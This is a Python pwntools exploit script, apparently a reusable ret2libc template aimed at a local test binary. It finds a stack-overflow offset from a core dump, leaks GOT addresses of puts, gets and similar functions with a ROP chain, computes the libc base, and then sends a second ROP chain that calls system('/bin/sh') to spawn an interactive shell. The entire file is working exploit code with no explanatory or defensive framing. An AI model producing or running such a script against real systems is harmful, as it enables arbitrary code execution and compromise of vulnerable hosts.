from pwn import *
#context.log_level = 'debug'
elf = ELF("./tests/ret")
rop = ROP(elf)
offset_leaking = elf.process()

#script = """
#b* 0x401185
#"""
#p = elf.debug(gdbscript=script)

p = elf.process()

context.arch = 'amd64'

### FIND OFFSET 
OFFSET = b""
if OFFSET == b"":
	log.info("Searching for offset")
	offset_leaking.sendline(cyclic(516,n=8))
	offset_leaking.wait()
	core = Coredump('./core')
	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
	log.info(f"Offset is {OFFSET}")

### LEAK PUTS AND GETS
p.recv()

def recovery(message, *args, exception=Exception, callback=lambda: None):
	try:
		rop.call(*args)
	except exception:
		log.warning(message)
		callback()

list_to_leak = ['puts', 'gets', 'printf', 'read', '__libc_start_main']
available_funcs = tuple(name for name in elf.got.keys() if name in list_to_leak)

for func in available_funcs:
	recovery(f"No {func} in GOT", elf.symbols["puts"], [elf.got[func]])

recovery(f"No main found...", elf.symbols["main"])

payload1 = [
	b"A"*OFFSET,
	rop.chain()
]

payload1 = b"".join(payload1)
p.sendline(payload1)

for name in available_funcs: 
	leaked = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
	log.info(f"{name} @ {hex(leaked)}")

### CHECK IF YOU FOUND LIBC
LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
if LIBC:
	libc = ELF(LIBC)
	libcbase = leaked - libc.symbols[available_funcs[-1]]
	log.info(f"base libc {hex(libcbase)}")
else:
	log.warning("No LIBC set. Please go to https://libc.blukat.me/")
	exit()

### SPAWN /bin/sh
roplibc = ROP(libc)
RET = (roplibc.find_gadget(['ret']))[0]
POP_RDI = (roplibc.find_gadget(['pop rdi', 'ret']))[0]
BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("POP_RDI @ 0x{:x}".format(POP_RDI+libcbase))
log.info("/bin/sh @ 0x{:x}".format(BINSH+libcbase))
log.info("system @ 0x{:x}".format(SYSTEM+libcbase))
log.info("exit @ 0x{:x}".format(EXIT+libcbase))


payload2 = [
	b"A"*OFFSET,
	p64(RET+libcbase),
	p64(POP_RDI+libcbase),
	p64(BINSH+libcbase),
	p64(SYSTEM+libcbase),
	p64(EXIT+libcbase)
]
payload2 = b"".join(payload2)

p.sendline(payload2)
p.interactive()
